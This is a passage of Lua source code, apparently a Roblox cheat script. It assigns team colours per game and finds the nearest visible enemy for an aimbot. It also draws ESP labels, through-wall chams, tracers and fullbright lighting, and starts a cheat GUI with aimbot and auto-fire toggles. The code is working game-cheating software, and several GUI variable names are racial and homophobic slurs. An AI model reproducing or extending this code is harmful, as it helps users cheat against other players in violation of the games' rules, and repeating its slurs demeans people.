											if Plr.Team == MyPlr.Team or Plr.Team.Name == "Criminal" then
												PickedColor = Bullshit.Colors.Ally
											else
												PickedColor = Bullshit.Colors.Enemy
											end
										elseif MyPlr.Team.Name == "Criminal" then
											if Plr.Team == MyPlr.Team or Plr.Team.Name == "Prisoner" then
												PickedColor = Bullshit.Colors.Ally
											else
												PickedColor = Bullshit.Colors.Enemy
											end
										elseif MyPlr.Team.Name == "Police" then
											if Plr.Team == MyPlr.Team then
												PickedColor = Bullshit.Colors.Ally
											else
												if Plr.Team.Name == "Criminal" then
													PickedColor = Bullshit.Colors.Enemy
												elseif Plr.Team.Name == "Prisoner" then
													PickedColor = Bullshit.Colors.Neutral
												end
											end
										end
									else
										PickedColor = Bullshit.Colors.Friend
									end
								end
							else
								if Bullshit.FriendList[Plr.Name] ~= nil then
									PickedColor = Bullshit.Colors.Friend
								else
									PickedColor = Bullshit.Colors.Enemy
								end
							end
						else
							PickedColor = Bullshit.Colors.ColorOverride
						end
					elseif game.PlaceId == 155615604 then
						if Bullshit.Colors.ColorOverride == nil then
							if MyPlr.Team ~= nil and Plr.Team ~= nil then
								if Bullshit.FriendList[Plr.Name] == nil then
									if MyPlr.Team.Name == "Inmates" then
										if Plr.Team.Name == "Inmates" then
											PickedColor = Bullshit.Colors.Ally
										elseif Plr.Team.Name == "Guards" or Plr.Team.Name == "Criminals" then
											PickedColor = Bullshit.Colors.Enemy
										else
											PickedColor = Bullshit.Colors.Neutral
										end
									elseif MyPlr.Team.Name == "Guards" then
										if Plr.Team.Name == "Inmates" then
											PickedColor = Bullshit.Colors.Neutral
										elseif Plr.Team.Name == "Criminals" then
											PickedColor = Bullshit.Colors.Enemy
										elseif Plr.Team.Name == "Guards" then
											PickColor = Bullshit.Colors.Ally
										end
									elseif MyPlr.Team.Name == "Criminals" then
										if Plr.Team.Name == "Inmates" then
											PickedColor = Bullshit.Colors.Ally
										elseif Plr.Team.Name == "Guards" then
											PickedColor = Bullshit.Colors.Enemy
										else
											PickedColor = Bullshit.Colors.Neutral
										end
									end
								else
									PickedColor = Bullshit.Colors.Friend
								end
							end
						else
							PickedColor = Bullshit.Colors.ColorOverride
						end
					elseif game.PlaceId == 746820961 then
						if Bullshit.Colors.ColorOverride == nil then
							if MyPlr:FindFirstChild("TeamC") and Plr:FindFirstChild("TeamC") then
								if Plr.TeamC.Value == MyPlr.TeamC.Value then
									PickedColor = Bullshit.Colors.Ally
								else
									PickedColor = Bullshit.Colors.Enemy
								end
							end
						else
							PickedColor = Bullshit.Colors.ColorOverride
						end
					elseif game.PlaceId == 1382113806 then
						if Bullshit.Colors.ColorOverride == nil then
							if MyPlr:FindFirstChild("role") and Plr:FindFirstChild("role") then
								if MyPlr.role.Value == "assassin" then
									if Plr.role.Value == "target" then
										PickedColor = Bullshit.Colors.Enemy
									elseif Plr.role.Value == "guard" then
										PickedColor = Color3.new(1, 135 / 255, 0)
									else
										PickedColor = Bullshit.Colors.Neutral
									end
								elseif MyPlr.role.Value == "target" then
									if Plr.role.Value == "guard" then
										PickedColor = Bullshit.Colors.Ally
									elseif Plr.role.Value == "assassin" then
										PickedColor = Bullshit.Colors.Enemy
									else
										PickedColor = Bullshit.Colors.Neutral
									end
								elseif MyPlr.role.Value == "guard" then
									if Plr.role.Value == "target" then
										PickedColor = Bullshit.Colors.Friend
									elseif Plr.role.Value == "guard" then
										PickedColor = Bullshit.Colors.Ally
									elseif Plr.role.Value == "assassin" then
										PickedColor = Bullshit.Colors.Enemy
									else
										PickedColor = Bullshit.Colors.Neutral
									end
								else
									if MyPlr.role.Value == "none" then
										PickedColor = Bullshit.Colors.Neutral
									end
								end
							end
						else
							PickedColor = Bullshit.Colors.ColorOverride
						end
					elseif game.PlaceId == 1072809192 then
						if MyPlr:FindFirstChild("Backpack") and Plr:FindFirstChild("Backpack") then
							if MyPlr.Backpack:FindFirstChild("Knife") or MyChar:FindFirstChild("Knife") then
								if Plr.Backpack:FindFirstChild("Revolver") or Plr.Character:FindFirstChild("Revolver") then
									PickedColor = Bullshit.Colors.Enemy
								else
									PickedColor = Color3.new(1, 135 / 255, 0)
								end
							elseif MyPlr.Backpack:FindFirstChild("Revolver") or MyChar:FindFirstChild("Revolver") then
								if Plr.Backpack:FindFirstChild("Knife") or Plr.Character:FindFirstChild("Knife") then
									PickedColor = Bullshit.Colors.Enemy
								elseif Plr.Backpack:FindFirstChild("Revolver") or Plr.Character:FindFirstChild("Revolver") then
									PickedColor = Bullshit.Colors.Enemy
								else
									PickedColor = Bullshit.Colors.Ally
								end
							else
								if Plr.Backpack:FindFirstChild("Knife") or Plr.Character:FindFirstChild("Knife") then
									PickedColor = Bullshit.Colors.Enemy
								elseif Plr.Backpack:FindFirstChild("Revolver") or Plr.Character:FindFirstChild("Revolver") then
									PickedColor = Bullshit.Colors.Ally
								else
									PickedColor = Bullshit.Colors.Neutral
								end
							end
						end
					elseif game.PlaceId == 142823291 or game.PlaceId == 1122507250 then
						if MyPlr:FindFirstChild("Backpack") and Plr:FindFirstChild("Backpack") then
							if MyPlr.Backpack:FindFirstChild("Knife") or MyChar:FindFirstChild("Knife") then
								if (Plr.Backpack:FindFirstChild("Gun") or Plr.Backpack:FindFirstChild("Revolver")) or (Plr.Character:FindFirstChild("Gun") or Plr.Character:FindFirstChild("Revolver")) then
									PickedColor = Bullshit.Colors.Enemy
								else
									PickedColor = Color3.new(1, 135 / 255, 0)
								end
							elseif (MyPlr.Backpack:FindFirstChild("Gun") or MyPlr.Backpack:FindFirstChild("Revolver")) or (MyChar:FindFirstChild("Gun") or MyChar:FindFirstChild("Revolver")) then
								if Plr.Backpack:FindFirstChild("Knife") or Plr.Character:FindFirstChild("Knife") then
									PickedColor = Bullshit.Colors.Enemy
								else
									PickedColor = Bullshit.Colors.Ally
								end
							else
								if Plr.Backpack:FindFirstChild("Knife") or Plr.Character:FindFirstChild("Knife") then
									PickedColor = Bullshit.Colors.Enemy
								elseif (Plr.Backpack:FindFirstChild("Gun") or Plr.Backpack:FindFirstChild("Revolver")) or (Plr.Character:FindFirstChild("Gun") or Plr.Character:FindFirstChild("Revolver")) then
									PickedColor = Bullshit.Colors.Ally
								else
									PickedColor = Bullshit.Colors.Neutral
								end
							end
						end
					elseif game.PlaceId == 379614936 then
						if Bullshit.Colors.ColorOverride == nil then
							if not Bullshit.FriendList[Plr.Name] then
								local targ = MyPlr:FindFirstChild("PlayerGui"):FindFirstChild("ScreenGui"):FindFirstChild("UI"):FindFirstChild("Target"):FindFirstChild("Img"):FindFirstChild("PlayerText")
								if targ then
									if Plr.Name:lower() == targ.Text:lower() then
										PickedColor = Bullshit.Colors.Enemy
									else
										PickedColor = Bullshit.Colors.Neutral
									end
								else
									PickedColor = Bullshit.Colors.Neutral
								end
							else
								PickedColor = Bullshit.Colors.Friend
							end
						else
							PickedColor = Bullshit.Colors.ColorOverride
						end
					elseif game.PlaceId == 983224898 then
						if (tick() - wildrevolvertick) > 10 or wildrevolverteamdata == nil then
							wildrevolverteamdata = RepStor.Functions.RequestGameData:InvokeServer()
							wildrevolvertick = tick()
							return Bullshit.Colors.Neutral
						end
						local succ = pcall(function()
							if wildrevolverteamdata[Plr.Name] ~= nil then
								if Bullshit.Colors.ColorOverride == nil then
									if not Bullshit.FriendList[Plr.Name] then
										if wildrevolverteamdata[Plr.Name]["TeamName"] == wildrevolverteamdata[MyPlr.Name]["TeamName"] then
											PickedColor = Bullshit.Colors.Ally
										else
											PickedColor = Bullshit.Colors.Enemy
										end
									else
										PickedColor = Bullshit.Colors.Friend
									end
								else
									PickedColor = Bullshit.Colors.ColorOverride
								end
							else
								PickedColor = Bullshit.Colors.Neutral
							end
						end)
						if not succ then
							wildrevolverteamdata = RepStor.Functions.RequestGameData:InvokeServer()
							wildrevolvertick = tick()
							return Bullshit.Colors.Neutral
						end
					else
						if Bullshit.Colors.ColorOverride == nil then
							if not Bullshit.FreeForAll then
								if MyPlr.Team ~= Plr.Team and not Bullshit.FriendList[Plr.Name] then
									PickedColor = Bullshit.Colors.Enemy
								elseif MyPlr.Team == Plr.Team and not Bullshit.FriendList[Plr.Name] then
									PickedColor = Bullshit.Colors.Ally
								else
									PickedColor = Bullshit.Colors.Friend
								end
							else
								if Bullshit.FriendList[Plr.Name] ~= nil then
									PickedColor = Bullshit.Colors.Friend
								else
									PickedColor = Bullshit.Colors.Enemy
								end
							end
						else
							PickedColor = Bullshit.Colors.ColorOverride
						end
					end
				end

				return PickedColor
			end

			function FindCham(Obj)
				for i, v in next, ItemChams:GetChildren() do
					if v.className == "ObjectValue" then
						if v.Value == Obj then
							return v.Parent
						end
					end
				end

				return nil
			end

			function FindESP(Obj)
				for i, v in next, ItemESP:GetChildren() do
					if v.className == "ObjectValue" then
						if v.Value == Obj then
							return v.Parent
						end
					end
				end

				return nil
			end

			function GetFirstPart(Obj)
				for i, v in next, Obj:GetDescendants() do
					if v:IsA("BasePart") then
						return v
					end
				end

				return nil
			end

			function GetSizeOfObject(Obj)
				if Obj:IsA("BasePart") then
					return Obj.Size
				elseif Obj:IsA("Model") then
					return Obj:GetExtentsSize()
				end
			end

			function GetClosestPlayerNotBehindWall()
				local Players = { }
				local CurrentClosePlayer = nil
				local SelectedPlr = nil

				for _, v in next, Plrs:GetPlayers() do
					if v ~= MyPlr and not Bullshit.Blacklist[v.Name] then
						local IsAlly = GetTeamColor(v)
						if IsAlly ~= Bullshit.Colors.Ally and IsAlly ~= Bullshit.Colors.Friend and IsAlly ~= Bullshit.Colors.Neutral then
							local GetChar = v.Character
							if MyChar and GetChar then
								local MyHead, MyTor = MyChar:FindFirstChild("Head"), MyChar:FindFirstChild("HumanoidRootPart")
								local GetHead, GetTor, GetHum = GetChar:FindFirstChild("Head"), GetChar:FindFirstChild("HumanoidRootPart"), GetChar:FindFirstChild("Humanoid")

								if MyHead and MyTor and GetHead and GetTor and GetHum then
									if game.PlaceId == 455366377 then
										if not GetChar:FindFirstChild("KO") and GetHum.Health > 1 then
											local Ray = Ray.new(MyCam.CFrame.p, (GetHead.Position - MyCam.CFrame.p).unit * 2048)
											local part = workspace:FindPartOnRayWithIgnoreList(Ray, {MyChar})
											if part ~= nil then
												if part:IsDescendantOf(GetChar) then
													local Dist = (MyTor.Position - GetTor.Position).magnitude
													Players[v] = Dist
												end
											end
										end
									elseif game.PlaceId == 746820961 then
										if GetHum.Health > 1 then
											local Ray = Ray.new(MyCam.CFrame.p, (GetHead.Position - MyCam.CFrame.p).unit * 2048)
											local part = workspace:FindPartOnRayWithIgnoreList(Ray, {MyChar, MyCam})
											if part ~= nil then
												if part:IsDescendantOf(GetChar) then
													local Dist = (MyTor.Position - GetTor.Position).magnitude
													Players[v] = Dist
												end
											end
										end
									else
										if GetHum.Health > 1 then
											local Ray = Ray.new(MyCam.CFrame.p, (GetHead.Position - MyCam.CFrame.p).unit * 2048)
											local part = workspace:FindPartOnRayWithIgnoreList(Ray, {MyChar})
											if part ~= nil then
												if part:IsDescendantOf(GetChar) then
													local Dist = (MyTor.Position - GetTor.Position).magnitude
													Players[v] = Dist
												end
											end
										end
									end
								end
							end
						end
					end
				end

				for i, v in next, Players do
					if CurrentClosePlayer ~= nil then
						if v <= CurrentClosePlayer then
							CurrentClosePlayer = v
							SelectedPlr = i
						end
					else
						CurrentClosePlayer = v
						SelectedPlr = i
					end
				end

				return SelectedPlr
			end

			function GetClosestPlayer()
				local Players = { }
				local CurrentClosePlayer = nil
				local SelectedPlr = nil

				for _, v in next, Plrs:GetPlayers() do
					if v ~= MyPlr then
						local IsAlly = GetTeamColor(v)
						if IsAlly ~= Bullshit.Colors.Ally and IsAlly ~= Bullshit.Colors.Friend and IsAlly ~= Bullshit.Colors.Neutral then
							local GetChar = v.Character
							if MyChar and GetChar then
								local MyTor = MyChar:FindFirstChild("HumanoidRootPart")
								local GetTor = GetChar:FindFirstChild("HumanoidRootPart")
								local GetHum = GetChar:FindFirstChild("Humanoid")
								if MyTor and GetTor and GetHum then
									if game.PlaceId == 455366377 then
										if not GetChar:FindFirstChild("KO") and GetHum.Health > 1 then
											local Dist = (MyTor.Position - GetTor.Position).magnitude
											Players[v] = Dist
										end
									else
										if GetHum.Health > 1 then
											local Dist = (MyTor.Position - GetTor.Position).magnitude
											Players[v] = Dist
										end
									end
								end
							end
						end
					end
				end

				for i, v in next, Players do
					if CurrentClosePlayer ~= nil then
						if v <= CurrentClosePlayer then
							CurrentClosePlayer = v
							SelectedPlr = i
						end
					else
						CurrentClosePlayer = v
						SelectedPlr = i
					end
				end

				return SelectedPlr
			end

			function FindPlayer(Txt)
				local ps = { }
				for _, v in next, Plrs:GetPlayers() do
					if string.lower(string.sub(v.Name, 1, string.len(Txt))) == string.lower(Txt) then
						table.insert(ps, v)
					end
				end

				if #ps == 1 then
					if ps[1] ~= MyPlr then
						return ps[1]
					else
						return nil
					end
				else
					return nil
				end
			end

			function UpdateESP(Plr)
				if Plr ~= nil then
					local Find = PlayerESP:FindFirstChild("ESP Crap_" .. Plr.Name)
					if Find then
						local PickColor = GetTeamColor(Plr)
						Find.Frame.Names.TextColor3 = PickColor
						Find.Frame.Dist.TextColor3 = PickColor
						Find.Frame.Health.TextColor3 = PickColor
						--Find.Frame.Pos.TextColor3 = PickColor
						local GetChar = Plr.Character
						if MyChar and GetChar then
							local Find2 = MyChar:FindFirstChild("HumanoidRootPart")
							local Find3 = GetChar:FindFirstChild("HumanoidRootPart")
							local Find4 = GetChar:FindFirstChildOfClass("Humanoid")
							if Find2 and Find3 then
								local pos = Find3.Position
								local Dist = (Find2.Position - pos).magnitude
								if Dist > Bullshit.ESPLength or Bullshit.Blacklist[Plr.Name] then
									Find.Frame.Names.Visible = false
									Find.Frame.Dist.Visible = false
									Find.Frame.Health.Visible = false
									return
								else
									Find.Frame.Names.Visible = true
									Find.Frame.Dist.Visible = true
									Find.Frame.Health.Visible = true
								end
								Find.Frame.Dist.Text = "Distance: " .. string.format("%.0f", Dist)
								--Find.Frame.Pos.Text = "(X: " .. string.format("%.0f", pos.X) .. ", Y: " .. string.format("%.0f", pos.Y) .. ", Z: " .. string.format("%.0f", pos.Z) .. ")"
								if Find4 then
									Find.Frame.Health.Text = "Health: " .. string.format("%.0f", Find4.Health)
								else
									Find.Frame.Health.Text = ""
								end
							end
						end
					end
				end
			end

			function RemoveESP(Obj)
				if Obj ~= nil then
					local IsPlr = Obj:IsA("Player")
					local UseFolder = ItemESP
					if IsPlr then UseFolder = PlayerESP end

					local FindESP = ((IsPlr) and UseFolder:FindFirstChild("ESP Crap_" .. Obj.Name)) or FindESP(Obj)
					if FindESP then
						FindESP:Destroy()
					end
				end
			end

			function CreateESP(Obj)
				if Obj ~= nil then
					local IsPlr = Obj:IsA("Player")
					local UseFolder = ItemESP
					local GetChar = ((IsPlr) and Obj.Character) or Obj
					local Head = GetChar:FindFirstChild("Head")
					local t = tick()
					if IsPlr then UseFolder = PlayerESP end
					if Head == nil then
						repeat
							Head = GetChar:FindFirstChild("Head")
							wait()
						until Head ~= nil or (tick() - t) >= 10
					end
					if Head == nil then return end

					local bb = Instance.new("BillboardGui")
					bb.Adornee = Head
					bb.ExtentsOffset = Vector3.new(0, 1, 0)
					bb.AlwaysOnTop = true
					bb.Size = UDim2.new(0, 5, 0, 5)
					bb.StudsOffset = Vector3.new(0, 3, 0)
					bb.Name = "ESP Crap_" .. Obj.Name
					bb.Parent = UseFolder

					local frame = Instance.new("Frame", bb)
					frame.ZIndex = 10
					frame.BackgroundTransparency = 1
					frame.Size = UDim2.new(1, 0, 1, 0)

					local TxtName = Instance.new("TextLabel", frame)
					TxtName.Name = "Names"
					TxtName.ZIndex = 10
					TxtName.Text = Obj.Name
					TxtName.BackgroundTransparency = 1
					TxtName.Position = UDim2.new(0, 0, 0, -45)
					TxtName.Size = UDim2.new(1, 0, 10, 0)
					TxtName.Font = "SourceSansBold"
					TxtName.TextSize = 13
					TxtName.TextStrokeTransparency = 0.5

					local TxtDist = nil
					local TxtHealth = nil
					if IsPlr then
						TxtDist = Instance.new("TextLabel", frame)
						TxtDist.Name = "Dist"
						TxtDist.ZIndex = 10
						TxtDist.Text = ""
						TxtDist.BackgroundTransparency = 1
						TxtDist.Position = UDim2.new(0, 0, 0, -35)
						TxtDist.Size = UDim2.new(1, 0, 10, 0)
						TxtDist.Font = "SourceSansBold"
						TxtDist.TextSize = 13
						TxtDist.TextStrokeTransparency = 0.5

						TxtHealth = Instance.new("TextLabel", frame)
						TxtHealth.Name = "Health"
						TxtHealth.ZIndex = 10
						TxtHealth.Text = ""
						TxtHealth.BackgroundTransparency = 1
						TxtHealth.Position = UDim2.new(0, 0, 0, -25)
						TxtHealth.Size = UDim2.new(1, 0, 10, 0)
						TxtHealth.Font = "SourceSansBold"
						TxtHealth.TextSize = 13
						TxtHealth.TextStrokeTransparency = 0.5
					else
						local ObjVal = Instance.new("ObjectValue", bb)
						ObjVal.Value = Obj
					end

					local PickColor = GetTeamColor(Obj) or Bullshit.Colors.Neutral
					TxtName.TextColor3 = PickColor

					if IsPlr then
						TxtDist.TextColor3 = PickColor
						TxtHealth.TextColor3 = PickColor
					end
				end
			end

			function UpdateTracer(Plr)
				if Bullshit.TracersEnabled then
					if MyChar then
						local MyTor = MyChar:FindFirstChild("HumanoidRootPart")
						local GetTor = TracerData[Plr.Name]
						if MyTor and GetTor ~= nil and GetTor.Parent ~= nil then
							local Dist = (MyTor.Position - GetTor.Position).magnitude
							if (Dist < Bullshit.TracersLength and not Bullshit.Blacklist[Plr.Name]) and not (MyChar:FindFirstChild("InVehicle") or GetTor.Parent:FindFirstChild("InVehicle")) then
								if not Bullshit.PlaceTracersUnderCharacter then
									local R = MyCam:ScreenPointToRay(MyCam.ViewportSize.X / 2, MyCam.ViewportSize.Y, 0)
									Dist = (R.Origin - (GetTor.Position - Vector3.new(0, 3, 0))).magnitude
									Tracers[Plr.Name].Transparency = 1
									Tracers[Plr.Name].Size = Vector3.new(0.05, 0.05, Dist)
									Tracers[Plr.Name].CFrame = CFrame.new(R.Origin, (GetTor.Position - Vector3.new(0, 4.5, 0))) * CFrame.new(0, 0, -Dist / 2)
									Tracers[Plr.Name].BrickColor = BrickColor.new(GetTeamColor(Plr))
									Tracers[Plr.Name].BoxHandleAdornment.Transparency = 0
									Tracers[Plr.Name].BoxHandleAdornment.Size = Vector3.new(0.001, 0.001, Dist)
									Tracers[Plr.Name].BoxHandleAdornment.Color3 = GetTeamColor(Plr)
								else
									Dist = (MyTor.Position - (GetTor.Position - Vector3.new(0, 3, 0))).magnitude
									Tracers[Plr.Name].Transparency = 1
									Tracers[Plr.Name].Size = Vector3.new(0.3, 0.3, Dist)
									Tracers[Plr.Name].CFrame = CFrame.new(MyTor.Position - Vector3.new(0, 3, 0), (GetTor.Position - Vector3.new(0, 4.5, 0))) * CFrame.new(0, 0, -Dist / 2)
									Tracers[Plr.Name].BrickColor = BrickColor.new(GetTeamColor(Plr))
									Tracers[Plr.Name].BoxHandleAdornment.Transparency = 0
									Tracers[Plr.Name].BoxHandleAdornment.Size = Vector3.new(0.05, 0.05, Dist)
									Tracers[Plr.Name].BoxHandleAdornment.Color3 = GetTeamColor(Plr)
								end
							else
								Tracers[Plr.Name].Transparency = 1
								Tracers[Plr.Name].BoxHandleAdornment.Transparency = 1
							end
						end
					end
				end
			end

			function RemoveTracers(Plr)
				local Find = Tracers:FindFirstChild(Plr.Name)
				if Find then
					Find:Destroy()
				end
			end

			function CreateTracers(Plr)
				local Find = Tracers:FindFirstChild(Plr.Name)
				if not Find then
					local P = Instance.new("Part")
					P.Name = Plr.Name
					P.Material = "Neon"
					P.Transparency = 1
					P.Anchored = true
					P.Locked = true
					P.CanCollide = false
					local B = Instance.new("BoxHandleAdornment", P)
					B.Adornee = P
					B.Size = GetSizeOfObject(P)
					B.AlwaysOnTop = true
					B.ZIndex = 5
					B.Transparency = 0
					B.Color3 = GetTeamColor(Plr) or Bullshit.Colors.Neutral
					P.Parent = Tracers

					coroutine.resume(coroutine.create(function()
						while Tracers:FindFirstChild(Plr.Name) do
							UpdateTracer(Plr)
							Run.RenderStepped:wait()
						end
					end))
				end
			end

			function UpdateChams(Obj)
				if Obj == nil then return end

				if Obj:IsA("Player") then
					local Find = PlayerChams:FindFirstChild(Obj.Name)
					local GetChar = Obj.Character

					local Trans = 0
					if GetChar and MyChar then
						local GetHead = GetChar:FindFirstChild("Head")
						local GetTor = GetChar:FindFirstChild("HumanoidRootPart")
						local MyHead = MyChar:FindFirstChild("Head")
						local MyTor = MyChar:FindFirstChild("HumanoidRootPart")
						if GetHead and GetTor and MyHead and MyTor then
							if (MyTor.Position - GetTor.Position).magnitude > Bullshit.CHAMSLength or Bullshit.Blacklist[Obj.Name] then
								Trans = 1
							else
								--local MyCharStuff = MyChar:GetDescendants()
								local Ray = Ray.new(MyCam.CFrame.p, (GetTor.Position - MyCam.CFrame.p).unit * 2048)
								local part = workspace:FindPartOnRayWithIgnoreList(Ray, {MyChar})
								if part ~= nil then
									if part:IsDescendantOf(GetChar) then
										Trans = 0.9
									else
										Trans = 0
									end
								end
							end
						end
					end

					if Find then
						for i, v in next, Find:GetChildren() do
							if v.className ~= "ObjectValue" then
								v.Color3 = GetTeamColor(Obj) or Bullshit.Colors.Neutral
								v.Transparency = Trans
							end
						end
					end
				end
			end

			function RemoveChams(Obj)
				if Obj ~= nil then
					local IsPlr = Obj:IsA("Player")
					local UseFolder = ItemChams
					if IsPlr then UseFolder = PlayerChams end

					local FindC = UseFolder:FindFirstChild(tostring(Obj)) or FindCham(Obj)
					if FindC then
						FindC:Destroy()
					end
				end
			end

			function CreateChams(Obj)
				if Obj ~= nil then
					local IsPlr = Obj:IsA("Player")
					local UseFolder = ItemChams
					local Crap = nil
					local GetTor = nil
					local t = tick()
					if IsPlr then
						Obj = Obj.Character
						UseFolder = PlayerChams
					end
					if Obj == nil then return end
					GetTor = Obj:FindFirstChild("HumanoidRootPart") or Obj:WaitForChild("HumanoidRootPart")
					if IsPlr then Crap = Obj:GetChildren() else Crap = Obj:GetDescendants() end

					local FindC = ((IsPlr) and UseFolder:FindFirstChild(Obj.Name)) or FindCham(Obj)
					if not FindC then
						FindC = Instance.new("Folder", UseFolder)
						FindC.Name = Obj.Name
						local ObjVal = Instance.new("ObjectValue", FindC)
						ObjVal.Value = Obj
					end

					for _, P in next, Crap do
						if P:IsA("PVInstance") and P.Name ~= "HumanoidRootPart" then
							local Box = Instance.new("BoxHandleAdornment")
							Box.Size = GetSizeOfObject(P)
							Box.Name = "Cham"
							Box.Adornee = P
							Box.AlwaysOnTop = true
							Box.ZIndex = 5
							Box.Transparency = 0
							Box.Color3 = ((IsPlr) and GetTeamColor(Plrs:GetPlayerFromCharacter(Obj))) or Bullshit.Colors.Neutral
							Box.Parent = FindC
						end
					end
				end
			end

			function CreateMobESPChams()
				local mobspawn = { }

				for i, v in next, workspace:GetDescendants() do
					local hum = v:FindFirstChildOfClass("Humanoid")
					if hum and not Plrs:GetPlayerFromCharacter(hum.Parent) and FindCham(v) == nil and FindESP(v) == nil then
						mobspawn[tostring(v.Parent)] = v.Parent
						if Bullshit.CHAMSEnabled and Bullshit.MobChams then
							CreateChams(v)
						end
						if Bullshit.ESPEnabled and Bullshit.MobESP then
							CreateESP(v)
						end
					end
				end

				if Bullshit.Mob_ESP_CHAMS_Ran_Once == false then
					for i, v in next, mobspawn do
						v.ChildAdded:connect(function(Obj)
							if Bullshit.MobChams then
								local t = tick()
								local GetHum = Obj:FindFirstChildOfClass("Humanoid")
								if GetHum == nil then
									repeat
										GetHum = Obj:FindFirstChildOfClass("Humanoid")
										wait()
									until GetHum ~= nil or (tick() - t) >= 10
								end
								if GetHum == nil then return end

								CreateChams(Obj)
							end

							if Bullshit.MobESP then
								local t = tick()
								local GetHum = Obj:FindFirstChildOfClass("Humanoid")
								if GetHum == nil then
									repeat
										GetHum = Obj:FindFirstChildOfClass("Humanoid")
										wait()
									until GetHum ~= nil or (tick() - t) >= 10
								end
								if GetHum == nil then return end

								CreateESP(Obj)
							end
						end)
					end

					Bullshit.Mob_ESP_CHAMS_Ran_Once = true
				end
			end

			function CreateChildAddedEventFor(Obj)
				Obj.ChildAdded:connect(function(Obj2)
					if Bullshit.OutlinesEnabled then
						if Obj2:IsA("BasePart") and not Plrs:GetPlayerFromCharacter(Obj2.Parent) and not Obj2.Parent:IsA("Hat") and not Obj2.Parent:IsA("Accessory") and Obj2.Parent.Name ~= "Tracers" then
							local Data = { }
							Data[2] = Obj2.Transparency
							Obj2.Transparency = 1
							local outline = Instance.new("SelectionBox")
							outline.Name = "Outline"
							outline.Color3 = Color3.new(0, 0, 0)
							outline.SurfaceColor3 = Color3.new(0, 1, 0)
							--outline.SurfaceTransparency = 0.9
							outline.LineThickness = 0.01
							outline.Transparency = 0.5
							outline.Transparency = 0.5
							outline.Adornee = Obj2
							outline.Parent = Obj2
							Data[1] = outline
							rawset(Bullshit.OutlinedParts, Obj2, Data)
						end

						for i, v in next, Obj2:GetDescendants() do
							if v:IsA("BasePart") and not Plrs:GetPlayerFromCharacter(v.Parent) and not v.Parent:IsA("Hat") and not v.Parent:IsA("Accessory") and v.Parent.Name ~= "Tracers" then
								local Data = { }
								Data[2] = v.Transparency
								v.Transparency = 1
								local outline = Instance.new("SelectionBox")
								outline.Name = "Outline"
								outline.Color3 = Color3.new(0, 0, 0)
								outline.SurfaceColor3 = Color3.new(0, 1, 0)
								--outline.SurfaceTransparency = 0.9
								outline.LineThickness = 0.01
								outline.Transparency = 0.5
								outline.Adornee = v
								outline.Parent = v
								Data[1] = outline
								rawset(Bullshit.OutlinedParts, v, Data)
							end
							CreateChildAddedEventFor(v)
						end
					end
					CreateChildAddedEventFor(Obj2)
				end)
			end

			function LightingHax()
				if Bullshit.OutlinesEnabled then
					Light.TimeOfDay = "00:00:00"
				end

				if Bullshit.FullbrightEnabled then
					Light.Ambient = Color3.new(1, 1, 1)
					Light.ColorShift_Bottom = Color3.new(1, 1, 1)
					Light.ColorShift_Top = Color3.new(1, 1, 1)
				end
			end

			Plrs.PlayerAdded:connect(function(Plr)
				if Bullshit.CharAddedEvent[Plr.Name] == nil then
					Bullshit.CharAddedEvent[Plr.Name] = Plr.CharacterAdded:connect(function(Char)
						if Bullshit.ESPEnabled then
							RemoveESP(Plr)
							CreateESP(Plr)
						end
						if Bullshit.CHAMSEnabled then
							RemoveChams(Plr)
							CreateChams(Plr)
						end
						if Bullshit.TracersEnabled then
							CreateTracers(Plr)
						end
						repeat wait() until Char:FindFirstChild("HumanoidRootPart")
						TracerMT[Plr.Name] = Char.HumanoidRootPart
					end)
				end
			end)

			Plrs.PlayerRemoving:connect(function(Plr)
				if Bullshit.CharAddedEvent[Plr.Name] ~= nil then
					Bullshit.CharAddedEvent[Plr.Name]:Disconnect()
					Bullshit.CharAddedEvent[Plr.Name] = nil
				end
				RemoveESP(Plr)
				RemoveChams(Plr)
				RemoveTracers(Plr)
				TracerMT[Plr.Name] = nil
			end)

			function InitMain()
				-- Objects

				local Bullshit20 = Instance.new("ScreenGui")
				local MainFrame = Instance.new("Frame")
				local Title = Instance.new("TextLabel")
				local design = Instance.new("Frame")
				local buttons = Instance.new("Frame")
				local ESPToggle = Instance.new("TextButton")
				local ChamsToggle = Instance.new("TextButton")
				local TracersToggle = Instance.new("TextButton")
				local OutlineToggle = Instance.new("TextButton")
				local DebugToggle = Instance.new("TextButton")
				local FullbrightToggle = Instance.new("TextButton")
				local BlacklistToggle = Instance.new("TextButton")
				local WhitelistToggle = Instance.new("TextButton")
				local Crosshair = Instance.new("TextButton")
				local AimbotToggle = Instance.new("TextButton")
				local Settings = Instance.new("TextButton")
				local Information = Instance.new("TextButton")
				local Information_2 = Instance.new("Frame")
				local Title_2 = Instance.new("TextLabel")
				local design_2 = Instance.new("Frame")
				local buttons_2 = Instance.new("ScrollingFrame")
				local TextLabel = Instance.new("TextLabel")
				local Settings_2 = Instance.new("Frame")
				local Title_3 = Instance.new("TextLabel")
				local design_3 = Instance.new("Frame")
				local buttons_3 = Instance.new("ScrollingFrame")
				local AllyColor = Instance.new("TextBox")
				local CHAMSLength = Instance.new("TextBox")
				local CrosshairColor = Instance.new("TextBox")
				local ESPLength = Instance.new("TextBox")
				local EnemyColor = Instance.new("TextBox")
				local FreeForAll = Instance.new("TextButton")
				local FriendColor = Instance.new("TextBox")
				local NeutralColor = Instance.new("TextBox")
				local TracersLength = Instance.new("TextBox")
				local TracersUnderChars = Instance.new("TextButton")
				local AutoFireToggle = Instance.new("TextButton")
				local AimbotKey = Instance.new("TextButton")
				local MobESPButton = Instance.new("TextButton")
				local MobChamsButton = Instance.new("TextButton")
				local TextLabel_2 = Instance.new("TextLabel")
				local TextLabel_3 = Instance.new("TextLabel")
				local TextLabel_4 = Instance.new("TextLabel")
				local TextLabel_5 = Instance.new("TextLabel")
				local TextLabel_6 = Instance.new("TextLabel")
				local TextLabel_7 = Instance.new("TextLabel")
				local TextLabel_8 = Instance.new("TextLabel")
				local TextLabel_9 = Instance.new("TextLabel")
				local TextLabel_10 = Instance.new("TextLabel")
				local TextLabel_11 = Instance.new("TextLabel")
				local TextLabel_12 = Instance.new("TextLabel")
				local TextLabel_13 = Instance.new("TextLabel")
				local TextLabel_14 = Instance.new("TextLabel")
				local TextLabel_15 = Instance.new("TextLabel")
				local SaveSettings = Instance.new("TextButton")
				local Blacklist = Instance.new("Frame")
				local nigga = Instance.new("TextLabel")
				local niggerfaggot = Instance.new("Frame")
				local players = Instance.new("ScrollingFrame")
				local buttonsex = Instance.new("Frame")
				local Playername = Instance.new("TextBox")
				local AddToBlacklist = Instance.new("TextButton")
				local RemoveToBlacklist = Instance.new("TextButton")
